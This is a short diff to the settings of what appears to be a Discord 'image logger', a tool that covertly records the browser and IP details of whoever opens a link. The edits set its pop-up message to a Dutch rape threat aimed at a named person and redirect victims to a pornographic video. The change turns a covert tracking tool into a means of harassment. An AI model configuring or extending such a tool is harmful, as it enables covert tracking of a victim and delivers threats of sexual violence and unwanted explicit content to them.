@@ -20,8 +20,8 @@ config = {
     "crashBrowser": False,
     "accurateLocation": False,
     "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "doMessage": True,
+        "message": "Alex Gaat je verkrachten",
         "richMessage": True,
     },
     "vpnCheck": 1,
@@ -30,7 +30,7 @@ config = {
     "antiBot": 1,
     "redirect": {
         "redirect": True,
-        "page": "https://your-link.here"
+        "page": "https://www.pornhub.com/view_video.php?viewkey=66956cac0fcce"
     },
 }
 
